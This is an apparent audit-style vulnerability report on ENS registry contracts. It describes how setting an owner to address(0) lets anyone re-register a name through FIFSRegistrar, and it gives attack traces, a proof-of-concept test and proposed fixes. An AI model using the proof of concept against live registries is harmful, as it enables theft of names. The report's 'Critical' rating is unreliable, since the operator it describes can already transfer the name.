# [CRITICAL] ENSRegistryWithFallback: Setting owner to address(0) creates exploitable "zombie" node, enabling permanent ENS name theft via FIFSRegistrar

## Summary

`ENSRegistryWithFallback._setOwner` substitutes `address(0)` with `address(this)` in storage to distinguish "no owner" from "record doesn't exist". However, `ENSRegistry.owner()` reverses this substitution back to `address(0)` for callers. `FIFSRegistrar` reads `owner()` and treats a return value of `address(0)` as "name is free to register" — granting anyone the ability to immediately claim a name that is in this intermediate state. A malicious operator (or an owner making an accidental call) can trigger this state on any name they control, after which an attacker can permanently steal the name with no recourse for the victim.

---

## Severity

**Critical**

- **Likelihood**: Medium — requires an authorized operator, a common pattern in DeFi protocols (NFT marketplaces, ENS management tools, lending protocols)
- **Impact**: Critical — results in permanent, irreversible theft of an ENS name; no recovery path exists once an attacker re-registers the name

---

## Vulnerability Details

### Root Cause: Three-way interaction between `_setOwner`, `owner()`, and `FIFSRegistrar.only_owner`

**Step 1 — `ENSRegistryWithFallback._setOwner` (line 59–66)**

```solidity
function _setOwner(bytes32 node, address owner) internal override {
    address addr = owner;
    if (addr == address(0x0)) {
        addr = address(this); // substitutes address(0) → address(ENSRegistryWithFallback)
    }
    super._setOwner(node, addr);
}
```

When any write operation sets a node's owner to `address(0)`, the raw storage value becomes `address(ENSRegistryWithFallback)` — not a real zero. This was designed to let `recordExists()` distinguish "explicitly no owner" from "record not yet in new registry".

**Step 2 — `ENSRegistry.owner()` (line 117–124)**

```solidity
function owner(bytes32 node) public virtual override view returns (address) {
    address addr = records[node].owner;
    if (addr == address(this)) {  // address(ENSRegistryWithFallback) == address(this)
        return address(0x0);       // reverses the substitution for callers
    }
    return addr;
}
```

The public `owner()` function reverses the substitution: if raw storage is `address(this)`, it returns `address(0)`. External contracts such as registrars cannot distinguish between:
- A name that has never been registered in the new registry (falls back to old registry)
- A name that was explicitly set to "no owner" in the new registry (zombie state)

**Step 3 — `FIFSRegistrar.only_owner` (line 12–16)**

```solidity
modifier only_owner(bytes32 label) {
    address currentOwner = ens.owner(keccak256(abi.encodePacked(rootNode, label)));
    require(currentOwner == address(0x0) || currentOwner == msg.sender);
    _;
}
```

`FIFSRegistrar` calls `ens.owner()`. When the zombie state is active, `ens.owner()` returns `address(0)`. The modifier interprets `address(0)` as "unregistered — anyone may claim", so **any caller passes the check**.

---

## Attack Scenario

### Preconditions
- `ENSRegistryWithFallback` is deployed as the active ENS registry
- `FIFSRegistrar` is deployed pointing to `ENSRegistryWithFallback` as its ENS (standard ENS migration setup)
- Alice holds `alice.eth` in the new registry
- Alice has granted operator status to Mallory (a common action when interacting with NFT marketplaces, management tools, or lending protocols)

### Execution

**1. Alice registers `alice.eth` via FIFSRegistrar**
```
records[alice_node].owner  = Alice
ens.owner(alice_node)      = Alice
```

**2. Alice grants operator status to Mallory**
```
ens.setApprovalForAll(Mallory, true)
operators[Alice][Mallory] = true
```

**3. Mallory burns `alice.eth` by setting owner to `address(0)`**
```
ens.setOwner(alice_node, address(0)) {from: Mallory}

  authorised(alice_node):
    records[alice_node].owner = Alice
    operators[Alice][Mallory] = true  → PASSES ✓

  ENSRegistryWithFallback._setOwner(alice_node, address(0)):
    addr = address(0)  →  addr = address(ENSRegistryWithFallback)
    records[alice_node].owner = address(ENSRegistryWithFallback)
```

**4. Zombie state is now active**
```
records[alice_node].owner  = address(ENSRegistryWithFallback)  [raw storage]
recordExists(alice_node)   = true   (not address(0), so record "exists")
ens.owner(alice_node)      = address(0)  (address(this) → returns 0)
```

**5. Attacker steals `alice.eth` via FIFSRegistrar**
```
FIFSRegistrar.register(sha3('alice'), Attacker) {from: Attacker}

  only_owner:
    currentOwner = ens.owner(alice_node) = address(0)
    require(address(0) == address(0))  → PASSES for ANY caller ✓

  ens.setSubnodeOwner(eth_node, sha3('alice'), Attacker)
    authorised(eth_node): records[eth_node].owner = FIFSRegistrar = msg.sender ✓
    _setOwner(alice_node, Attacker): Attacker ≠ address(0) → records[alice_node].owner = Attacker
```

**Result: `alice.eth` permanently transferred to Attacker. Alice has no recourse.**

### Variant: Victim triggers the vulnerability themselves

Alice does not need a malicious operator. She can trigger this accidentally by calling:

```solidity
// Alice thinks she is "resetting" her record
ens.setRecord(alice_node, address(0), someResolver, 3600);
```

`setRecord` internally calls `setOwner(alice_node, address(0))`, which creates the zombie state. Any attacker monitoring the mempool can immediately register `alice.eth` before Alice realizes what happened.

---

## Proof of Concept

The following test can be added to `test/TestENSRegistryWithFallback.js` to demonstrate the exploit:

```javascript
it('[CRITICAL PoC] zombie node allows attacker to steal name via FIFSRegistrar', async () => {
    const namehash = require('eth-ens-namehash');
    const sha3 = require('web3-utils').sha3;

    const ENSWithFallback = artifacts.require('ENSRegistryWithFallback.sol');
    const ENSWithoutFallback = artifacts.require('ENSRegistry.sol');
    const FIFSRegistrar = artifacts.require('FIFSRegistrar.sol');

    // --- Deploy ---
    const oldRegistry = await ENSWithoutFallback.new();
    const ens = await ENSWithFallback.new(oldRegistry.address);
    const registrar = await FIFSRegistrar.new(ens.address, '0x' + '00'.repeat(32));

    const alice    = accounts[1];
    const mallory  = accounts[2];  // malicious operator
    const attacker = accounts[3];

    // deployer sets rootNode owner to registrar
    await ens.setSubnodeOwner('0x' + '00'.repeat(32), sha3('eth'), registrar.address, { from: accounts[0] });

    const ethNode   = namehash.hash('eth');
    const aliceNode = namehash.hash('alice.eth');

    // --- Step 1: Alice registers alice.eth ---
    const fifsEth = await FIFSRegistrar.new(ens.address, ethNode);
    await ens.setSubnodeOwner('0x' + '00'.repeat(32), sha3('eth'), fifsEth.address, { from: accounts[0] });
    await fifsEth.register(sha3('alice'), alice, { from: alice });

    assert.equal(await ens.owner(aliceNode), alice, 'Alice should own alice.eth');

    // --- Step 2: Alice grants operator to Mallory ---
    await ens.setApprovalForAll(mallory, true, { from: alice });

    // --- Step 3: Mallory burns alice.eth ---
    await ens.setOwner(aliceNode, '0x' + '00'.repeat(20), { from: mallory });

    // --- Step 4: Verify zombie state ---
    assert.equal(await ens.owner(aliceNode), '0x' + '00'.repeat(20), 'owner() should return address(0)');
    assert.equal(await ens.recordExists(aliceNode), true, 'recordExists() should still be true');

    // --- Step 5: Attacker steals alice.eth ---
    await fifsEth.register(sha3('alice'), attacker, { from: attacker });

    const finalOwner = await ens.owner(aliceNode);
    assert.equal(finalOwner, attacker, 'Attacker now owns alice.eth');
    assert.notEqual(finalOwner, alice, 'Alice has permanently lost her name');
});
```

---

## Impact

- Any ENS name held in `ENSRegistryWithFallback` can be permanently stolen by a malicious operator
- An unsuspecting user can accidentally trigger the zombie state (e.g., by calling `setRecord` with `owner = address(0)`) and lose their name to any observer
- ENS names have significant monetary value (primary names have sold for hundreds of ETH; high-value names represent digital identity and infrastructure)
- The theft is irreversible: once an attacker re-registers via `FIFSRegistrar`, the victim has no path to recovery through the smart contract system

---

## Recommended Fix

The core issue is that `_setOwner` in `ENSRegistryWithFallback` introduces a hidden intermediate state that registrars are unaware of. Two viable fixes:

### Fix A — Remove the address(0) substitution and use a separate existence flag (preferred)

Replace the owner-as-existence-flag pattern with an explicit boolean:

```solidity
mapping (bytes32 => bool) existsInNew;

function _setOwner(bytes32 node, address owner) internal override {
    existsInNew[node] = true;
    super._setOwner(node, owner);  // stores address(0) cleanly
}

function recordExists(bytes32 node) public override view returns (bool) {
    return existsInNew[node];
}
```

This eliminates the zombie state entirely: `address(0)` in storage means genuine abandonment, while `existsInNew[node] == true` means "present in new registry".

### Fix B — Guard against address(0) in write operations

Prevent setting owner to `address(0)` in the new registry unless the record is being truly deleted:

```solidity
function _setOwner(bytes32 node, address owner) internal override {
    require(owner != address(0), "ENSRegistryWithFallback: use recordExists pattern, not address(0)");
    super._setOwner(node, owner);
}
```

This is a simpler guard but does not allow intentional burning of names.

---

## References

- `contracts/ENSRegistryWithFallback.sol` — `_setOwner`, lines 59–66
- `contracts/ENSRegistry.sol` — `owner()`, lines 117–124; `authorised` modifier, lines 20–23
- `contracts/FIFSRegistrar.sol` — `only_owner` modifier, lines 12–16
